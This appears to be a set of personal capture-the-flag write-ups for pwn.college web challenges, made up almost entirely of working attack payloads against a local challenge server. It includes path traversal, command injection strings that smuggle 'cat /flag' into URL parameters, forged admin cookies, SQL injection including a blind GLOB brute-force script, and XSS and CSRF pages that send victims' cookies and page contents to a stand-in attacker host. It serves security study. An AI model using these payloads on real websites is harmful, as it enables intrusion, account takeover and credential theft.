# Path Traversal 1
`curl http://challenge.localhost/payload/../../flag`, this url will be squashed to be `http://challenge.localhost/flag`.

The writeup is 
```sh
curl --path-as-is http://challenge.localhost/payload/../../flag
```

# Path Traversal 2
There is a `fortunes` folder in the /challenge/files.

And here are useless contents:
```plaintext
You can observe a lot just by watching.
                -- Yogi Berra
Haste makes waste.
                -- John Heywood
TV is chewing gum for the eyes.
                -- Frank Lloyd Wright
```
The writeup is `curl --path-as-is http://challenge.localhost:80/deliverables/fortunes/../../../flag`

# CMDi 1
The function `flask.request.args.get()` function is to get the URL parameters.
```sh
curl http://challenge.localhost:80/mission?topdir=.%3bcat%20/flag
```

# CMDi 2
Do you know what's the meaning of `&&` operator in bash?
```sh
curl http://challenge.localhost:80/quest?topdir=.%26%26cat%20/flag
```
It's strange that in the command `COMMAND1 | cat ARGS` if the `ARGS` is not empty then the COMMAND1 cannot output anything. So another writeup is `curl http://challenge.localhost:80/quest?topdir=.%7ccat%20/flag`.

# CMDi 3
`curl http://challenge.localhost:80/stage?folder=.%27%26%26cat%20%27/flag`

# CMDi 4
`curl http://challenge.localhost:80/event?time-zon=MST%3bcat%20/flag%3b`

# CMDi 5
`curl http://challenge.localhost:80/test?path=flag_%3bcat%20/flag%3eflag_ && cat flag_`

# CMDi 6
The semicolumn in bash play the same role with a newline('\n').

`curl http://challenge.localhost:80/quest?dir=.%0acat%20/flag`

# Authentication Bypass 1
This is writeup `curl http://challenge.localhost:80/?session_user=admin`.

I tried SQL injection but falled. This is some lines of source code.
```python
user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
```
This line cannot be SQL injected.

# Authentication Bypass 2
```python
import requests as req
url = 'http://challenge.localhost:80'
cookie= {"session_user": "admin"}
print(req.get(url, cookies=cookie).text)
```
Another writeup is `curl http://challenge.localhost:80 -H "Cookie: session_user=admin"`.

# SQLi 1
```python
import requests as req
s = req.Session()

url='http://challenge.localhost:80/login-page'
d = {'user-alias': 'admin', 'pin': '1 OR 1=1'}
print(s.post(url, data=d).text)
```

# SQLi 2
```python
import requests as req
s = req.Session()

url='http://challenge.localhost:80/authenticate'
d = {'profile-name': 'admin', 'pass': "' OR username='admin' --"}
print(s.post(url, data=d).text)
```

# SQLi 3
`curl "http://challenge.localhost:80/?query=admin\"%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username=\"admin"`

# SQLi 4
Attackers can get the table name unless the server program restarts.
```sh
curl 'http://challenge.localhost:80/?query=%"%20UNION%20SELECT%20tbl_name%20FROM%20sqlite_master--'
# So the table name is "users_7983180967"
curl 'http://challenge.localhost:80/?query=%"%20UNION%20SELECT%20password%20FROM%20users_7983180967--'
```

I think challenge SQLi 1~4 can be solved in browser definitly, but I did't try.

# SQLi 5
Unlike LIKE operator, GLOB is case-sensitive.
```python
import requests as req

url='http://challenge.localhost:80'

def brute_force():
    flag_content = ''
    # letters = [ chr(ch_num) for ch_num in range(0x21, 0x7E+1) ] # all possible printable letters
    letters = [ chr(ch_num) for ch_num in range(0x0, 0x7E+1) ] # Then I found there is an annoying extra char '\n' by this command
    # remove wildcards
    letters.remove('*')
    letters.remove('?')

    # while flag_content == '' or flag_content[-1] != '}': # use this line I can't find the '\n' char and the confirm() function fails, but the flag is right.
    while len(flag_content) < 2 or flag_content[-2] != '}':
        for letter in letters:
            passwd = "' OR username='admin' AND password GLOB 'pwn.college{" + flag_content + letter + "*"
            d={
                'username': 'admin',
                'password': passwd
            }
            r = req.post(url,data=d)
            if r:
                flag_content += letter
                break
            if letter == letters[-1]:
                flag_content += '?'
        print(flag_content)
    print("pwn.college{" + flag_content)
    return flag_content

def confirm(flag_content):
    passwd = "' OR username='admin' AND password = 'pwn.college{" + flag_content
    d={
        'username': 'admin',
        'password': passwd
    }
    r = req.post(url,data=d)

if __name__ == '__main__':
    confirm(brute_force())
```

# XSS(Cross Site Script) 1
Ctrl + Shift + \` in VScode or tmux command tool helped me a lot when I work in these XSS challenges.
To check the HTML page(debug) better, I write these:
```sh vals.sh
url="http://challenge.localhost:80"
alias web=curl\ $url
```
Shortcoming is I should maually do `source vals.sh` for each challenge.

## writeup
Run `/challenge/server` first.
```sh
curl $url --form-string "content=<input>" # url=http://challenge.localhost:80
/challenge/victim
```
I really hate the --form-string. It takes me so many time to find it.
The -F flag will automatically parse the form `key=<filename` and try to read the content of the `filename` file.

# XSS 2
`curl $url --form-string "content=<script>alert('Giv me flag')</script>"`

# XSS 3
Run `/challenge/server` first.

`/challenge/victim "$url/?msg=%3cscript%3ealert('')%3c/script%3e"`

# XSS 4
Run `/challenge/server` first.

`/challenge/victim "$url/?msg=%3c/textarea%3e%3cscript%3ealert('')%3c/script%3e%3ctextarea%3e"`

# XSS 5
In this challenge we assume the victim is the administrator.
When the administrator login his/her account, our XSS runs to make use of the admin account to publish the sensitive info(it's flag in the challenge).

Hacker can login and use the `/draft` backdoor to inject JavaScript which can use the `/publish` route to publish the flag. After the victim(administrator) login, the flag can be seen by anyone who logged in.

### Writeup
Keep `/challenge/server` open.
```python
import requests as req
import pwn

url="http://challenge.localhost:80"

s = req.Session()

h_login = s.post(url + '/login', data = {
    "username": "hacker",
    "password": "1337"
})

h_inj = s.post(url + '/draft', data = {
    'publish': 1,
    'content': f"<script>fetch(\'{url + '/publish'}\')</script>"
})

p = pwn.process('/challenge/victim')
p.wait()

print(s.get(url).text)
```

# XSS 6
The same as challenge 5 but with different parameter of fetch().
```python
# Only injection part of the codes.
h_inj = s.post(url + '/draft', data = {
    'publish': 1,
    'content': f"<script>fetch(\'{url + '/publish'}\'" + ', {method:"POST"})</script>'
})
```

# XSS 7
Only login admin's account can read the flag.
Since the cookie contains the password, use XSS to let the victim send the cookie(which contains password) to the hacker's device.

If it's really need to send a cross-site request for the developers, here's a solution by JavaSript:
```html
<script>
fetch('http://attacker-server:9999', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify({ cookie: document.cookie }), // Send the cookie in JSON format
    credentials: 'include' // Ensures cookies are included, even for cross-origin requests
});
</script>
```
But what we need is the `document.cookie`.
So it's respectful of the desciption for the challenge that
"and everything you need is available via JavaScript's fetch() and its ability to access (some) site cookies"
Since the `document.cookie` method is irrelavant with `fetch()` function.

## writeup
The injection part below.
```python
s.post(url + '/draft', data = {
    'publish': 1,
    'content': '<script>fetch("' + hacker_url + '", {method: "POST", credentials: "include", body: document.cookie})</script>'
})
```
Keep the `/challenge/server` on, do injection, using `nc -lv localhost 7777` to listen, then run `/challenge/victim`.

This means there should be at least 3 terminal tabs exist in the same time.

# CSRF(Cross Site Request forgery) 1
In this challenge, SameSite property of Cookie is set to be Lax.
Only when the request is same-site or of cross-site top-level GET navigation can Cookies be sent.

### Cross-site examples
Below these are allowed.
```
<a href="..."></a>
<link rel="prerender" href="..."/>
<form method="GET" action="...">
```
But things like `<img>` label or `<iframe>` or other javascript request are not allowed to send Cookies.

### writeup
Keep /challenge/server running, then keep below server on.
```python csrf1_server.py
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    # return '''
    #     <html>
    #         <head>
    #             <meta http-equiv="refresh" content="0; url=http://challenge.localhost/publish" />
    #         </head>
    #     </html>
    # '''
    ### This javascript cause navigating rather than sending request. So this also work out.
    return '''
        <script>
            window.location.href = 'http://challenge.localhost/publish';
        </script>
    '''

app.config['SERVER_NAME'] = f"hacker.localhost:1337"
app.run(host='hacker.localhost', port=1337)
```
And then use `/challenge/victim` to publish the flag. Then every user can see the flag content.
```python guest_login.py
import requests as req

url = 'http://challenge.localhost:80/login'
s = req.Session()

resp = s.post(url, data={'username': 'guest', 'password': 'password'})
print(resp.text)
```

# CSRF 2
In this challenge, the victim send POST request by CSRF to the same site(`/challenge/server`).

### writeup
The same as Challenge CSRF 1.
```python csrf2.py
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return '''
        <html>
            <form id='aaa' action="http://challenge.localhost:80/publish" method="post"></form>
            <script>
                let form = document.getElementById('aaa');
                form.submit();
            </script>
        </html>
    '''

app.config['SERVER_NAME'] = f"hacker.localhost:1337"
app.run(host='hacker.localhost', port=1337)
```

# CSRF 3
The same as Challenge CSRF 1.
```python csrf3.py
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    return '''
        <script>
            window.location.href = "http://challenge.localhost:80/ephemeral?msg=%3cscript%3ealert()%3c/script%3e";
        </script>
    '''

app.config['SERVER_NAME'] = f"hacker.localhost:1337"
app.run(host='hacker.localhost', port=1337)
```

# CSRF 4
Similar to Challenge CSRF 3.
Set up `hacker.localhost:1337` to use CSRF to inject XSS to leak the cookie.
```python csrf4.py
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    js_str = '''var%20cookie=document.cookie;fetch(%27http://hacker.localhost:1337/?%27%2b%20cookie)'''
    return '''
        <script>
            window.location.href = "http://challenge.localhost:80/ephemeral?msg=%3cscript%3e''' + js_str + '''%3c/script%3e";
        </script>
    '''

app.config['SERVER_NAME'] = f"hacker.localhost:1337"
app.run(host='hacker.localhost', port=1337)
```
Then get the password of admin. Login the admin account to get the flag.

# CSRF 5
Similar to Challenge CSRF 4.
```python csrf5.py
from flask import Flask

app = Flask(__name__)

@app.route('/')
def index():
    ### the below comment is wrong because fetch() function is async.
    # js_str = '''var html="";
    #             fetch("http://challenge.localhost:80/", {credentials: "include"}).then(response => response.text()).then(text => {html=text;});
    #             fetch("http://hacker.localhost:1337" + html)'''
    js_str = '''var html="";
                fetch("http://challenge.localhost:80/", {credentials: "include"})
                    .then(response => response.text())
                    .then(text => {
                        html=text; fetch("http://hacker.localhost:1337/?html=" + html)
                    });
    '''
    js_str = js_str.replace(' ', '%20').replace('"', '%22').replace("\n", '%0a').replace('+', '%2b')
    return '''
        <script>
            window.location.href = "http://challenge.localhost:80/ephemeral?msg=%3cscript%3e''' + js_str + '''%3c/script%3e";
        </script>
    '''

app.config['SERVER_NAME'] = f"hacker.localhost:1337"
app.run(host='hacker.localhost', port=1337)
```
